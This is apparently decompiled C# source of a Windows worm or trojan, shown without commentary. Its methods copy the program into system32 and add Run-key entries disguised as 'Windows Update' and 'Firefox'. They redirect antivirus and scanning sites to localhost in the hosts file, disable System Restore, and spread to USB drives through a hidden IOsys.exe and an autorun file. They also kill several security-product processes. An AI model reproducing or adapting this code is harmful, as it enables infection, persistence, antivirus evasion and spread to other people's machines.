using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	[DebuggerNonUserCode]
	public Class5()
	{
	}

	public static void smethod_0()
	{
		try
		{
			string fileName = Path.GetFileName(Application.get_ExecutablePath());
			string text = Conversions.ToString(((ServerComputer)Class1.Class0_0).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "PathName", (object)null));
			if (File.Exists(text + "\\system32\\" + fileName))
			{
				((ServerComputer)Class1.Class0_0).get_FileSystem().DeleteFile(text + "\\system32\\" + fileName);
			}
			File.Copy(Application.get_ExecutablePath(), text + "\\system32\\" + fileName);
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update", (object)(text + "\\system32\\" + fileName), RegistryValueKind.String);
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Firefox", (object)Assembly.GetEntryAssembly()!.Location, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		try
		{
			string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			StreamWriter streamWriter = new StreamWriter(path, append: true);
			string value = "\n 127.0.0.1 www.virustotal.com";
			string text = "\n 127.0.0.1 www.bitdefender.com";
			string text2 = "\n 127.0.0.1 www.virusscan.jotti.org";
			string text3 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
			streamWriter.Write(value);
			streamWriter.Write("\r\n" + text);
			streamWriter.Write("\r\n" + text2);
			streamWriter.Write("\r\n" + text3);
			streamWriter.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3()
	{
		try
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4()
	{
		try
		{
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		checked
		{
			int num = logicalDrives.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType != DriveType.Removable || !driveInfo.IsReady)
				{
					continue;
				}
				try
				{
					if (!File.Exists(logicalDrives[i] + "IOsys.exe"))
					{
						string fileName = Path.GetFileName(Application.get_ExecutablePath());
						File.Copy(fileName, logicalDrives[i] + "IOsys.exe", overwrite: true);
						((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllText(logicalDrives[i] + "Boot.inf", "[autorun]" + Environment.NewLine + "open=" + logicalDrives[i] + "IOsys.exe" + Environment.NewLine + "shellexecute=" + logicalDrives[i], true);
						File.SetAttributes(logicalDrives[i] + "IOsys.exe", FileAttributes.Hidden);
						File.SetAttributes(logicalDrives[i] + "Boot.inf", FileAttributes.Hidden);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public static void smethod_6()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "outpost", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_7()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "npfmsg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_8()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "bdagent", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_9()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "egui", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void smethod_10()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "zlclient", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}
}
